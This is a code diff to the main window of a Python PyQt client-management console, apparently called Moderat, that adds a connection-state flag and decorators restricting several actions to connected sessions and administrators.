@@ -13,6 +13,7 @@ from libs.language import Translate
 from libs.moderat.Actions import Actions
 from libs.moderat.Modes import Modes
 from libs.moderat.Settings import Config
+from libs.moderat.Decorators import *
 from libs.gui import triggers, shortcuts
 from ui import gui
 
@@ -22,6 +23,8 @@ _ = lambda _word: translate.word(_word)
 
 # Main Window
 class MainDialog(QMainWindow, gui.Ui_MainWindow):
+
+    connected = False
 
     DATA = os.path.join(os.path.dirname(sys.argv[0]), 'DATA')
     modulesBank = {}
@@ -125,6 +128,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         On Moderator Connected To Server
         :return:
         '''
+        self.connected = True
         self.ipv4Label.setText(self.SERVER_HOST+':'+str(self.SERVER_PORT))
         self.action.login()
 
@@ -134,6 +138,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         :param reason:
         :return:
         '''
+        self.connected = False
         self.ipv4Label.setText('N/A')
         self.action.disconnect()
 
@@ -167,6 +172,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         '''
         self.action.set_log_settings()
 
+    @connected_to_server
     def update_source(self):
         '''
         Update Clients Source
@@ -182,6 +188,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         '''
         self.action.execute_module(module)
 
+    @is_administrator
     def set_moderator(self):
         '''
         Set Moderator For Client
@@ -189,6 +196,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         '''
         self.action.administrator_set_moderator()
 
+    @connected_to_server
+    @is_administrator
     def get_moderators(self):
         '''
         Get Moderators Information
@@ -196,6 +205,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         '''
         self.action.administrator_get_moderators()
 
+    @connected_to_server
+    @is_administrator
     def create_moderator(self):
         '''
         Create New Moderator
@@ -203,6 +214,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         '''
         self.action.administrator_create_moderator()
 
+    @connected_to_server
     def check_clients(self):
         '''
         Update Clients Information
@@ -210,6 +222,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         '''
         self.moderator.send_msg(message='getClients', mode='getClients', session_id=self.session_id)
 
+    @connected_to_server
     def send_signal(self, data):
         if self.modulesBank.has_key(data['module_id']):
             self.modulesBank[data['module_id']].signal(data)
